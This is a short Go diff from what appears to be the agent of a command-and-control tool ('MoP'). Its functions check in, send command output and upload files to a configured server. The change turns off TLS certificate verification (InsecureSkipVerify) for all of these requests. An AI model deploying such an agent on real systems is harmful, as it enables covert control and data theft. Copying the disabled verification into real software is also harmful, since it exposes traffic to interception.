@@ -4,13 +4,20 @@ import (
 	"MoP/src/config"
 	"MoP/src/models"
 	"bytes"
+	"crypto/tls"
 	"encoding/json"
 	"io"
 	"net/http"
 	"strconv"
 )
 
-var conf = config.Load()
+var (
+	conf = config.Load()
+	tr   = &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client = &http.Client{Transport: tr}
+)
 
 func Presentation(agent models.NewAgent) {
 
@@ -25,7 +32,7 @@ func Presentation(agent models.NewAgent) {
 	})
 	payload := bytes.NewBuffer(body)
 
-	resp, err := http.Post(url, "application/json", payload)
+	resp, err := client.Post(url, "application/json", payload)
 	if err != nil {
 		return
 	}
@@ -128,7 +135,7 @@ func PostCommand(agentID int, command string, resp string, agent models.NewAgent
 	payload := new(bytes.Buffer)
 	json.NewEncoder(payload).Encode(body)
 
-	response, err := http.Post(url, "application/json", payload)
+	response, err := client.Post(url, "application/json", payload)
 	if err != nil {
 		return
 	}
@@ -148,7 +155,7 @@ func PostFile(agent models.NewAgent, file models.File) {
 	payload := new(bytes.Buffer)
 	json.NewEncoder(payload).Encode(body)
 
-	response, err := http.Post(url, "application/json", payload)
+	response, err := client.Post(url, "application/json", payload)
 	if err != nil {
 		return
 	}
